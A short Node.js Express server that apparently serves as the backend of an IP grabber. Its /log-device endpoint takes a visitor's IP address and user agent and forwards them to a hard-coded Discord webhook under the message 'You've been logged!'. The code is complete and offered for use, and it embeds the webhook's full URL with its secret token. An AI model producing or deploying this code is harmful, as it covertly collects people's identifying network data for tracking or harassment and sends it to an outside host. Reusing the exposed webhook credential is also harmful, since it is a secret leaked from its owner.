const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const webhook = 'https://discord.com/api/webhooks/1308890616213671986/Mls06215HviC-3jqdbUpQwJXC5o3KZeQZC3eR1Cg9c3nJWPUhjLabwBuY3XhtafVD2ns';

app.use(express.json());

app.post('/log-device', (req, res) => {
    const { ip, userAgent } = req.body;

    const message = {
        content: `**You've been logged!**\n\n` +
                 `**IP Address**: ${ip}\n` +
                 `**User Agent**: ${userAgent}\n`
    };

    axios.post(webhook, message)
        .then(response => {
            console.log('Webhook sent successfully');
            res.status(200).send('Logged successfully!');
        })
        .catch(error => {
            console.error('Error sending webhook:', error);
            res.status(500).send('Error logging data');
        });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
